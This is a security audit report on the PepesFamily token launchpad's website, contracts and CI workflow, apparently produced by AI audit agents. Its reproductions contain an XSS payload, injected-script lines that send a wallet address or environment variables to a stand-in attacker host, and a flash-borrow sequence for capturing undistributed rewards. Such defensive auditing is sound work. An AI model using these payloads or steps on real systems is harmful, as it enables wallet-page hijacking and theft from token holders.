# Audit report

> Audit request: PepesFamily wallet safety (website, repository, claim flow)
>
> Repository: https://github.com/0xtenang/PepesFamily (branch main)
> Live site: https://pepesfamily.fun, deployed from web/ on main via Vercel
> Chain: Robinhood Chain (chain ID 4663)
>
> Background
> Holders earn rewards in IMD or ETH from a 3% fee on every trade and withdraw them with claim(). Many holders don't claim because they're afraid that connecting a wallet to the site, or claiming, could drain it. We want an independent check of whether that's possible, and a clear answer we can share with the community.
>
> The main question
> Can anything on pepesfamily.fun, or in the contracts it calls, take funds or tokens from a holder's wallet beyond what the holder knowingly approves in a single action?
>
> 1. Website (web/index.html, one file)
> Please list every request the site makes to a wallet, and confirm for each one:
>
> what the user is asked to sign;
> which contract it goes to;
> how much it can spend, and whether the amount is exact or unlimited;
> whether it could be abused later.
> The requests we know of:
>
> Action	Wallet request	What to check
> Connect	eth_requestAccounts, wallet_switchEthereumChain, wallet_addEthereumChain	No signatures and no approvals. EIP-6963 wallet picker.
> Claim rewards (token page and #/rewards)	claim() to the token contract, 0 ETH	No approval of any kind; rewards go only to the signer.
> Buy with ETH	buy / buyWithEth on our routers, with ETH value equal to the amount typed	The value sent equals the amount shown.
> Buy with IMD	approve(router, amount) on IMD, then buy	The approval is for the exact amount, never unlimited.
> Sell (v2 and v3 tokens)	EIP-2612 Permit signature (signTypedData), with an approval fallback	Spender is our router, value is the exact amount, deadline is 10 minutes.
> Sell (v1 tokens such as Pepes)	sell on the v1 router, no approval	See the router exemption in section 2.
> Launch	launch on the router, with optional ETH value	
> Admin page	collectProtocolFees, flush, distribute	Funds can only go to the fixed fee address or to holders, whoever signs.
> Please also check:
>
> The page never requests eth_sign, personal_sign, unlimited approvals, setApprovalForAll, Permit2, or any signature beyond those listed above.
> Supply chain: the only external script is ethers 6.13.4 from cdnjs, pinned with a Subresource Integrity hash. There are no other scripts, trackers or analytics.
> Content Security Policy:
> in the page: script-src allows only 'unsafe-inline' and cdnjs; connect-src https:;
> in web/vercel.json: frame-ancestors 'none', plus HSTS, nosniff and no-referrer.
> Is anything too permissive? For example, could 'unsafe-inline' or connect-src https: be abused?
> Injection through user content: token names, symbols, descriptions, image links and social links are written by token creators and stored on-chain. Confirm they're always escaped (esc()), that links are limited to https:// and ipfs:// (safeUrl, ipfsPath), and that no inline event handlers are used.
> Address and contract integrity: all contract addresses are hard-coded in CONFIG at the top of the file. Can a visitor be tricked into sending a transaction to a different contract, for example through URL parameters (#/t/<address>, #/rewards/<address>) or a fake token page?
> Clickjacking: confirm the site can't be framed by another site.
> 2. Contracts a holder touches
> Paths are in contracts/src/:
>
> claim() in PadToken.sol (v3), v2/PadTokenV2.sol and v1/PadTokenV1.sol: confirm it can only pay the caller, can't move the caller's tokens, and can't be used by anyone else to take a holder's rewards.
> v1 router exemption: in v1/PadTokenV1.sol, transferFrom lets the v1 router move tokens without an allowance, so selling takes one step. Confirm the router (PepesFamilyRouter, v1 at 0xA73604EA3C393B47573986ff9Ce5A9EAb61883dC) can only ever pull tokens from its own caller, and that no function or sequence lets one user move another user's tokens.
> Routers (PepesFamilyRouter.sol, PepesFamilyEthRouter.sol): confirm no function can pull a user's tokens or IMD beyond the allowance or permit that user gave for that trade, and that leftover approvals can't be used by anyone else.
> Admin powers: confirm the owner can't move holder funds, change balances, or redirect rewards in any version.
> 3. GitHub repository and deployment
>
> What could an attacker change? Anyone who can push to main changes the live site automatically. Please describe the risk, and what protections you'd recommend: branch protection, required reviews, signed commits, 2FA, Vercel settings.
> The workflow .github/workflows/verify-tokens.yml runs every 15 minutes with permissions: contents: read and runs contracts/script/verify-tokens.sh. Confirm it can't be used to modify the repository or leak secrets.
> Submodules: forge-std and v4-core are pinned to fixed commits.
> Deployed contracts (all source-verified)
>
> v3: launchpad 0xC5a1f48C03635b83D79667463785bC2c6BcE28cC, router 0x8A9b6A990d13f25F6393aCacfB013F980c763a27, ETH router 0x891B710b36D0bDb1D6B53CB979696EbE43c2d129
> v2: launchpad 0x072Fb5A1B65F30d59BcD11BEeD99803675bCE8CC, router 0x85D6695CBE0BaF221a4BBd39F0b368B893e70D4b, ETH router 0xce3540Bf1D4b219B7B2055508A83B09A0e1df9eF
> v1: launchpad 0x2d7689E48Fd71D9A0f225C673D7b8F8A693368CC, router 0xA73604EA3C393B47573986ff9Ce5A9EAb61883dC, ETH router 0x79eeE0C12C1284bc046e4494Eea6180695F5028A
> Pepes token (v1): 0xE2C46c7068566740A33A4C93f5445B07BCfE5644
> What we'd like back
>
> A plain-language answer to the main question that we can share with holders: "Can connecting or claiming drain a wallet? Yes or no, and why."
> Every finding, with a severity and a suggested fix.
> A list of exactly what a user should expect to see in their wallet for each action, so holders can check for themselves.

| | |
|---|---|
| Repository | https://github.com/0xtenang/PepesFamily.git |
| Commit | `c726b0856d1ecb6250ea388fcf0f6b96a9b60a20` |
| Job | `cacfe941-8815-4639-b298-eaf5cbf0ba35` |
| Judged | 2026-10-03 08:05 UTC |
| Findings | 1 medium · 3 low · 7 info |

Four agents audited the code as it is at `c726b08`, each in one area (math, permissions, economics, control flow),
and a judge reproduced, merged and ranked what they found, then read the code once more itself. Nothing in the repository was changed or deployed.

## Findings

### 1. Medium: v1/v2 tokens: distribute()/claim() inside a PoolManager unlock lets a flash-borrower take holders' not-yet-distributed rewards (immutable; Pepes is v1)

`contracts/src/v1/PadTokenV1.sol:148`

```
    function distribute() public returns (uint256 amount) {
```

PadTokenV1.distribute() (this line) and PadTokenV2.distribute() (contracts/src/v2/PadTokenV2.sol:199) have no `isUnlocked()` guard, and both versions' claim() calls pad.flush(), which in the deployed v1/v2 launchpads (git a549093 and 68ba9e3, `if (poolManager.isUnlocked()) _flush(token);`) runs the distribution inline for ANY caller mid-unlock. While the Uniswap v4 PoolManager is unlocked anyone can `take()` the pool's whole token balance (flash accounting) and return it before the unlock ends; while borrowed those tokens count toward eligibleSupply, so a distribution in that window pays the borrower who owns nothing. What is at risk is only reward money that has NOT yet been distributed: pendingHolderFees in the v1/v2 launchpad from swaps routed through third-party routers (GMGN, aggregators, the Uniswap app) and quote sitting unaccounted in the token contract. Rewards already distributed (withdrawableDividendOf) cannot be taken, a holder's tokens/ETH/IMD in their own wallet are never touched, and claim() only pays msg.sender, so this is not a wallet drain. It does mean the statement 'nobody else can take a holder's rewards' is false for v1/v2 pending fees, and it is MEV-able after every third-party trade. v3 (contracts/src/PadToken.sol:206, PepesFamily.sol:374) has the guards and pays the borrower zero. Merged from audit_flow (same mechanism). Fix: nothing can be changed in v1/v2 bytecode. Keep pending fees near zero by calling PepesFamily.flush(token) from an ordinary transaction (outside any unlock) on a keeper schedule after each third-party trade, not manually from the Admin page; tell holders that claiming also flushes; steer volume to v3. Document this as a known limitation in the holder FAQ.

**Reproduction**

Scratch Foundry test (contracts/test/scratch/Judge.t.sol, test_v1Token_flashBorrowerTakesPendingRewards / test_v2Token_...): deploy PadTokenV1 (and V2) with poolManager = a fresh v4 PoolManager; transfer 800,000,000e18 to the PoolManager (the pool's balance) and 200,000,000e18 to alice (the only real holder, eligibleSupply = 2e26); send 1 ETH to the token as not-yet-distributed rewards. A Borrower contract with 0 tokens calls poolManager.unlock(); in unlockCallback it take()s the 800M tokens, calls token.distribute() then token.claim(), then sync/transfer/settle returns the tokens. Expected: borrower receives 0 and alice's withdrawable share is 1 ETH. Actual (forge test --offline --match-path test/scratch/Judge.t.sol -vv): v1 attacker gain 799999999999999999 wei, alice share 199999999999999999 wei; v2 identical (799999999999999999). The same sequence against v3 PadToken (test_v3Token_flashBorrowerGetsNothing) pays the borrower 0 and alice 999999999999999999. On mainnet the inline distribution is reached through claim() -> v1/v2 pad.flush() while unlocked, so any pendingHolderFees[token] from third-party-router swaps is captured the same way.

### 2. Low: Trade table writes Blockscout's transaction_hash into innerHTML unescaped; with script-src 'unsafe-inline' a spoofed or compromised API response runs script in the wallet-connected page

`web/index.html:1662`

```
    <td><a href="${CONFIG.explorer}/tx/${t.hash}" target="_blank" rel="noopener">↗</a></td></tr>`).join("")
```

fetchTradeLogs() copies `i.transaction_hash` straight out of the Blockscout JSON into `hash` (line 1641: `hash: i.transaction_hash`) and loadTrades() interpolates `${t.hash}` into a double-quoted href attribute inside `$("#trades").innerHTML` without esc() and without checking it is 0x + 64 hex. Every other dynamic value on the page is escaped, ABI-decoded by ethers (type-checked), or a number; this is the only string from an external service that reaches the DOM raw (the RPC fallback on line 1652 uses ethers' validated transactionHash and is not affected; the home-page feed on line 855 uses transaction_hash only as a Map key). Because the page CSP (line 6) allows script-src 'unsafe-inline', an attribute breakout with an inline event handler executes in the pepesfamily.fun origin with access to the connected provider: it could rewrite CONFIG.pads[].router or the Permit spender so the next Buy/Sell prompt targets an attacker contract (the wallet still shows a prompt, but it appears to come from the legitimate site). Precondition: the attacker controls the body served for CONFIG.blockscoutApi (compromised explorer, poisoned cache/CDN, hostile network with a mis-issued certificate), so this is a defence-in-depth gap, not something a token creator or URL can trigger. Merged from audit_economics, audit_flow and audit_permissions (same sink). Fix: in fetchTradeLogs keep only items whose transaction_hash matches /^0x[0-9a-fA-F]{64}$/ (drop the row otherwise) and render `${esc(t.hash)}`; apply the same validation to any future field copied from an API response.

**Reproduction**

State: token page #/t/0xE2C46c7068566740A33A4C93f5445B07BCfE5644 open; GET {blockscoutApi}/addresses/<pad>/logs?topic=<padded token> returns one item whose topics/data are a valid Trade log (copy any real one) but whose transaction_hash is `"><img src=x onerror="alert(document.domain)">`. Trace: the filter on line 1640 passes (topics[0] == Trade topic, topics[1] == token), line 1641 sets hash to that string, line 1662 builds the row. Evaluating the template literal with that value (node -e with the same expression) yields `<td><a href="https://robinhoodchain.blockscout.com/tx/"><img src=x onerror="alert(document.domain)">" target="_blank" rel="noopener">↗</a></td>`: the attribute closes at the injected quote, the <img> loads, its onerror runs because 'unsafe-inline' permits inline handlers. Expected: the hash is rendered inert (esc) or the row is dropped. Actual: attacker-supplied JavaScript executes in the page origin.

### 3. Low: Hook fee taken in beforeSwap is 4% of the requested amount, not of the executed amount: a partially filled swap (binding price limit) pays far more than 4%

`contracts/src/PepesFamily.sol:310`

```
        uint256 fee = exactIn ? (amount * FEE_BPS) / BPS : (amount * FEE_BPS) / (BPS - FEE_BPS);
```

When the quote is the swap's specified currency (exact-in buy, exact-out sell), beforeSwap computes the fee from params.amountSpecified before the pool runs, returns it as the specified-side BeforeSwapDelta and mints that many claims in _chargeFee. If the swap then stops at the caller's sqrtPriceLimitX96 (partial fill), the pool consumes only part of the amount but the fee stays 4% of the full request; the surplus lands in pendingProtocolFees/pendingHolderFees. In the exact-out sell variant, if the partial payout is smaller than the up-front fee, line 350 (`poolQuote - fee`) underflows and the swap reverts with Panic(0x11). Reachability: PepesFamilyRouter and PepesFamilyEthRouter always pass MIN/MAX price limits, so only swaps submitted with a binding limit through a third-party router or a direct PoolManager unlock are affected, and only the trader who chose that limit loses, bounded by 4% of what they requested. This was reported in the earlier launchpad audit and is already disclosed on the site (CONFIG.audits.launchpad.note); it is kept here because it reproduces on the current code and a holder trading through GMGN/Uniswap with a price limit would be surprised. Fix (preserves the design): in afterSwap, when the fee came from FEE_SLOT, compare the executed specified amount with the request and revert with a dedicated error on a partial fill (afterSwap cannot return a specified-side delta, so a refund is not available); or document that partially filled fee-up-front swaps overpay.

**Reproduction**

Scratch Foundry test test_partialFill_exactInBuy_feeNot4pct (contracts/test/scratch/Judge.t.sol): fresh deployment with the repo parameters (ETH start cap 1.5 ETH); alice buys 1 ETH via PepesFamilyRouter; bob submits an exact-in buy of 1 ETH via PoolSwapTest with sqrtPriceLimitX96 = getSqrtPriceAtTick(currentTick - 100). Expected: fee == 4% of what bob actually paid (±1 wei). Actual: PoolManager ETH balance rose by 52548070343463998 wei (bob's executed gross) while pendingProtocolFees rose by 10000000000000000 (fee = 40000000000000000 wei) = 7612 bps of the executed amount instead of 400. Test output: `fee is not 4% of executed amount: 40000000000000000 !~= 2101922813738559`.

### 4. Low: CSP relies on script-src 'unsafe-inline' and connect-src https: wss:, and keeps http://127.0.0.1:8545 / http://localhost:8545 in production, so any markup injection becomes code execution with unrestr

`web/index.html:6`

```
<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' https: data:; connect-src https: wss: http://127.0.0.1:8545 http://localhost:8545; base-uri 'none'; form-action 'none'; object-src 'none'" />
```

The brief describes the policy as `connect-src https:`; the shipped meta policy is `connect-src https: wss: http://127.0.0.1:8545 http://localhost:8545` and `script-src 'unsafe-inline' https://cdnjs.cloudflare.com`. The page has exactly two inline <script> blocks (lines 16-19 and 231-1690) and no inline event-handler attributes (comment at line 476, confirmed by grep: no on*= attributes, no javascript: URLs), which is precisely the case a hash-based CSP handles: replacing 'unsafe-inline' with the SHA-256 of the two script bodies keeps the page working while making injected inline handlers inert. As written, 'unsafe-inline' turns every HTML sink into a script sink (see the transaction_hash finding), connect-src https: wss: lets injected code post the connected address and captured data to any host, and the two localhost origins are development leftovers with no production use. frame-ancestors 'none', HSTS, nosniff and no-referrer in web/vercel.json were verified correct (X-Frame-Options DENY as well). Not exploitable on its own; it decides whether the one remaining sink is harmless or total. Merged from audit_permissions (low) and audit_economics (info). Fix: set `script-src 'sha256-<hash1>' 'sha256-<hash2>' https://cdnjs.cloudflare.com`; narrow connect-src to the hosts actually used (robinhood-rpc.publicnode.com, rpc.mainnet.chain.robinhood.com, robinhoodchain.blockscout.com; IPFS gateways are img-src); drop wss: and the localhost entries (keep them in a local dev copy); consider moving the policy into web/vercel.json headers so one header covers both frame-ancestors and the rest, and update the public description to match the header exactly.

**Reproduction**

Input: read the delivered <meta http-equiv="Content-Security-Policy"> on line 6. Expected per the brief: connect-src https: only. Actual: `connect-src https: wss: http://127.0.0.1:8545 http://localhost:8545`. With this policy, a string reaching an innerHTML sink unescaped containing `<img src=x onerror="fetch('https://attacker.example/?a='+account)">` executes (unsafe-inline) and the fetch succeeds (https: wildcard); `new WebSocket('wss://attacker.example')` and `fetch('http://localhost:8545')` are also permitted. With a hash-based script-src the handler is blocked and a CSP violation is logged while the two legitimate scripts still match their hashes. Hashes to place in the policy: `python3 -c "import hashlib,re,base64; s=open('web/index.html').read(); [print('sha256-'+base64.b64encode(hashlib.sha256(m.encode()).digest()).decode()) for m in re.findall(r'<script>(.*?)</script>', s, re.S)]"`.

### 5. Info: setStartTick accepts ticks whose launch liquidity exceeds v4's maxLiquidityPerTick, so every launch for that quote reverts until the owner resets it

`contracts/src/PepesFamily.sol:457`

```
        if (tick % TICK_SPACING != 0 || tick > limit || tick < -limit) revert BadTick();
```

_setStartTick bounds the tick by maxUsableTick(200) - 200 = ±887000, but the launch liquidity L = (TOTAL_SUPPLY - 1e9) * 2^96 / (sqrtU - sqrtL) (token is currency1) grows without bound as the start price moves toward the curve's minimum, and the PoolManager rejects liquidity above tickSpacingToMaxLiquidityPerTick(200) with TickLiquidityOverflow. L crosses that at a start tick of about -349300, far inside the accepted range, so the guard does not protect what it claims to (AUDIT.md 6.3: 'an extreme tick can brick launches'). Owner-only, fail-closed (launch reverts; nothing is mispriced or lost), reversible by setting a sane tick, and economically nonsensical (start cap ~1.5e24 quote), hence informational. The deployed v3 pad uses 203000 (ETH) and 142600 (IMD), which are safe. Fix: in _setStartTick compute the liquidity the launch would use for both currency orderings and revert if it exceeds Pool.tickSpacingToMaxLiquidityPerTick(TICK_SPACING), or tighten the bound to ±349200.

**Reproduction**

Scratch Foundry test test_startTick_minus349400_bricksLaunch (contracts/test/scratch/Judge.t.sol): owner calls setStartTick(address(0), -349200) and launch succeeds; owner then calls setStartTick(address(0), -349400) (accepted: multiple of 200, within ±887000) and `pad.launch("boom","boom","",address(0))` reverts inside _addLaunchLiquidity (PoolManager.modifyLiquidity -> TickLiquidityOverflow). Expected: either setStartTick rejects the tick or the launch succeeds. Actual: setStartTick succeeds and every subsequent ETH launch reverts (test passes with vm.expectRevert).

### 6. Info: A trade made while eligibleSupply < 1e18 (always the first buy, typically the creator's launch buy) lets that trader recover their own 3% holder fee

`contracts/src/PadToken.sol:210`

```
        if (bal <= accountedBalance || eligible < MIN_ELIGIBLE_SUPPLY) return 0;
```

The routers flush and distribute holder fees before the buyer receives tokens so a trader never earns from their own trade (PepesFamilyRouter.sol:180-182, AUDIT.md section 4). On the first buy nobody holds anything at that moment, so distribute() takes this early return and the 3% waits in the token contract unaccounted. After the transaction the same buyer, now the only holder, calls distribute() (public, no unlock in progress) and then claim() and receives the whole 3% back: the effective fee on the first buy is 1% instead of 4%. The same happens for any trade executed while eligible supply is below MIN_ELIGIBLE_SUPPLY. No third party loses funds (there are no other holders at that moment); the creator effectively gets a 3% rebate on the launch buy that later buyers do not get. AUDIT.md section 8 already accepts that early fees go to the holders present at the next distribution; reported for the record as a boundary case of the 'never earns from own trade' statement. Fix options (product decision): document it; or when eligible < MIN_ELIGIBLE_SUPPLY at flush time route the holder share to feeRecipient or burn it instead of leaving it in the token contract.

**Reproduction**

Scratch Foundry test test_firstBuy_rebate (contracts/test/scratch/Judge.t.sol): launch an IMD-quoted token (no holders); bob buys with 10 IMD via PepesFamilyRouter.buy. After the trade withdrawableDividendOf(bob) == 0 and the token holds 0.3 IMD unaccounted. Bob calls token.distribute() then token.claim(). Expected per the documented design: bob earns nothing from his own trade (net cost 10 IMD). Actual: withdrawable after distribute() = 299999999999999999 wei; bob's net cost of the 10 IMD buy = 9700000000000000001 wei (fee effectively 1%). The same sequence via router.launch(..., initialBuy=10e18) gives the creator the rebate.

### 7. Info: verify-tokens.sh passes creator-chosen name/symbol/metadata to `cast abi-encode` as bare arguments: a token named like a cast flag is never source-verified

`contracts/script/verify-tokens.sh:40`

```
    args=$(cast abi-encode "f(string,string,string,address,address,address,address)" \
```

name, symbol and metadata are written by whoever launches a token (1-32 / 1-12 / up to 2048 bytes, any characters) and are passed positionally to `cast abi-encode` with no `--` separator, so a value beginning with '-' is parsed by cast as an option instead of a string. The constructor args are then wrong (or are cast's help text), both forge verify-contract calls fail, and because the Sourcify check keeps failing the token is retried and fails again every 15 minutes. Impact is limited to that token staying unverified (scanners show it as closed source) plus wasted CI minutes. It does NOT let anyone modify the repository or leak secrets: the workflow has `permissions: contents: read`, references no secrets, and the injected text only reaches cast/forge as an option name, never a shell (all expansions are quoted). Fix: put `--` before the values (`cast abi-encode "f(...)" -- "$name" "$symbol" "$metadata" ...`).

**Reproduction**

Run locally with the Foundry 1.8.3 cast on this box: `cast abi-encode "f(string,string,string,address,address,address,address)" "--help" S {} 0x00..00 0x00..01 0x00..01 0x00..01`. Expected: a 0x-prefixed ABI encoding whose first string is "--help". Actual: cast prints its usage text ("ABI encode the given function argument, excluding the selector ...") and exits 0, so $args is help text. With "--packed" as the name cast exits 1 with "encode length mismatch: expected 7 types, got 6" and $args is empty. With `--` inserted before the values the same command returns `0x00000000000000000000000000000000000000000000000000000000000000e0...` (correct encoding). A token named "--help" (6 bytes) is accepted by PepesFamily._launch.

### 8. Info: Launch-with-initial-buy sends minTokensOut = 0, so the creator's first buy has no price floor if startTick changes between the preview and the transaction

`web/index.html:1414`

```
      const tx = await router.launch($("#n").value.trim(), $("#s").value.trim(), JSON.stringify(m), quote, initialBuy, 0n,
```

renderCreate() previews the initial buy at lines 1385-1389 (virtual quote from padR.startTick(quote), 4% fee, x*y=k), but the transaction passes minTokensOut = 0n. The only state that can move the result is startTick[quote], which the owner may change at any time with setStartTick() (PepesFamily.sol:437, an intended and documented owner power); nobody else can affect a pool that does not exist yet, so this is not front-runnable by third parties. Every other trade on the page passes withSlippage(expected, slipBps) while the launch buy, which can be a creator's largest single buy, passes zero. Trust assumption: the owner key (0x3c8A...691C, also the fee recipient) is honest and not compromised. Fix: compute the preview amount in the submit handler and pass withSlippage(out, 500) (or the slippage input) instead of 0n.

**Reproduction**

State: IMD start tick for a 635 IMD starting market cap (Deploy.s.sol default). A creator previews a 100 IMD initial buy: net 96 IMD, out = 1e27*96/(635+96) ≈ 131.3M tokens, and submits. Input: before the launch transaction is sequenced, the owner calls setStartTick(IMD, tick) for a 6,350 IMD market cap. Expected: the launch reverts with Slippage() because tokensOut (≈ 14.9M) is far below the preview. Actual: line 1414 passes 0n as minTokensOut, so PepesFamilyRouter.launch succeeds and the creator receives ≈ 14.9M tokens for the same 100 IMD. With withSlippage(out, 500) (≈ 124.7M) the same sequence reverts.

### 9. Info: Token pages show an 'Audit' button that falls back to the launchpad report for every token, and render creator-chosen name/symbol/image with no impostor warning, so a look-alike launch of Pepes is ind

`web/index.html:1456`

```
                <a class="btn" href="${(CONFIG.audits.tokens[addr.toLowerCase()] || CONFIG.audits.launchpad).url}" target="_blank" rel="noopener noreferrer" title="${esc((CONFIG.audits.tokens[addr.toLowerCase()] || CONFIG.audits.launchpad).result)}">Audit ↗</a>
```

PepesFamily.launch() is permissionless and only checks lengths (PepesFamily.sol:242), so anyone can launch a second token named Pepes / PEPES with the same image and description. The site escapes these strings correctly (no XSS), and every transaction still goes to the hard-coded router of the launchpad that created the token, so this is not a wallet drain: the user gets exactly what they signed for. It answers the brief's 'fake token page' question: a visitor following a shared #/t/<impostor> link sees a page matching the real Pepes page in name, ticker, picture and links; only the short address and the 'launchpad v3' label differ, and the Audit button on this line opens the launchpad audit for any token not in CONFIG.audits.tokens, which makes an impostor look audited. CONFIG.audits.tokens already knows the canonical Pepes address, so the page has the data to flag the difference. Fix: show the Audit button only for addresses present in CONFIG.audits.tokens (or label the fallback 'Launchpad audit', not 'Audit'), and show an 'Unverified / name collides with <earlier token>' notice when name or symbol matches an earlier launch on any pad.

**Reproduction**

Input: call PepesFamilyRouter.launch("Pepes", "PEPES", <metadata JSON copied from 0xE2C46c70...5644>, address(0), 0, 0) on the v3 router 0x8A9b6A990d13f25F6393aCacfB013F980c763a27 and open https://pepesfamily.fun/#/t/<new address>. Expected: the page warns that another token with this name and ticker exists and that this one is not the audited Pepes token. Actual: renderToken() shows 'Pepes', '$PEPES', the Pepes image and links, and `(CONFIG.audits.tokens[addr.toLowerCase()] || CONFIG.audits.launchpad).url` resolves to the launchpad report, so an 'Audit ↗' button appears with no warning; a Buy sends ETH (correctly) to the v3 router for the impostor token.

### 10. Info: Google Fonts is a third external origin loaded on every visit, contradicting the 'only external resource is ethers from cdnjs' statement

`web/index.html:14`

```
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
```

The brief states the only external script is ethers 6.13.4 from cdnjs with an SRI hash, and that is true for scripts (line 15, integrity sha512, crossorigin anonymous). However the page also loads a stylesheet from fonts.googleapis.com (preconnect line 13, link line 14) and font files from fonts.gstatic.com, both allowed by the CSP (style-src and font-src). CSS cannot sign or change transactions, so this is not a wallet-safety issue, but it is a privacy and availability dependency (every visitor's IP and user agent reach Google; an outage degrades the page) and a compromised stylesheet origin could overlay or restyle visible text such as the 'You receive' preview, though the wallet prompt itself would stay truthful. The public statement to holders should say 'no other scripts; one font stylesheet from Google' or the dependency should be removed. Merged from audit_permissions and audit_economics. Fix: self-host the three IBM Plex Mono weights under web/ and tighten style-src to 'unsafe-inline' (or a hash) and font-src to 'self'.

**Reproduction**

Input: open https://pepesfamily.fun with the network panel open and no wallet connected. Expected per the stated supply-chain model: requests only to pepesfamily.fun, cdnjs.cloudflare.com, robinhood-rpc.publicnode.com and robinhoodchain.blockscout.com. Actual: line 14 `<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono..." rel="stylesheet" />` requests Google Fonts CSS, which in turn loads woff2 files from fonts.gstatic.com, both permitted by line 6 (`style-src 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com`).

### 11. Info: verify-tokens.yml references actions by mutable tags; blast radius is already minimal (contents: read, no secrets) but pinning to commit SHAs removes the remaining supply-chain trust

`.github/workflows/verify-tokens.yml:25`

```
      - uses: foundry-rs/foundry-toolchain@v1
```

The workflow is correctly locked down: `permissions: contents: read` (so GITHUB_TOKEN cannot push, open PRs or write releases), no repository secrets are referenced, and the script only reads public chain state and submits source to Sourcify/Blockscout, which verify bytecode themselves. It therefore cannot modify the repository or leak secrets, confirming the brief's expectation. The remaining trust is in two third-party actions resolved by floating tags (actions/checkout@v4 on line 22 and foundry-rs/foundry-toolchain@v1 here). If either tag were re-pointed to malicious code, the runner would execute it every 15 minutes with the read-only token: it could not touch main or the Vercel deployment, but could burn Actions minutes or abuse the runner. Separately, since anyone who can push to main deploys the live site, the repository settings (not visible in the tree) should enforce branch protection on main with required reviews, required signed commits, 2FA for all collaborators, and Vercel's production branch locked to main with deployment protection enabled. Fix: pin both actions to full commit SHAs with a version comment and enable Dependabot for github-actions.

**Reproduction**

State: the schedule trigger fires with the current file. Input: the upstream v1 tag of foundry-rs/foundry-toolchain is moved to a commit that adds `curl attacker.example -d "$(env)"`. Expected with SHA pinning: the workflow keeps running the audited commit. Actual: the next run executes the new code; env contains a read-only GITHUB_TOKEN and no project secrets, so the measurable damage is limited to runner abuse, which is why this is informational rather than a defect. Verified in the tree: line 22 `- uses: actions/checkout@v4`, line 25 `- uses: foundry-rs/foundry-toolchain@v1`, `permissions:` block = `contents: read`, no `secrets.` reference.

---

Judge's submission `cf557e2cf2f6c7aea17f9ef9970f76db38ddada884959a7ae6f994d5993a1d69`, accepted on the IdentityMD network. Acceptance means the report met the job's checks;
it is not a guarantee that the code has no other defects.
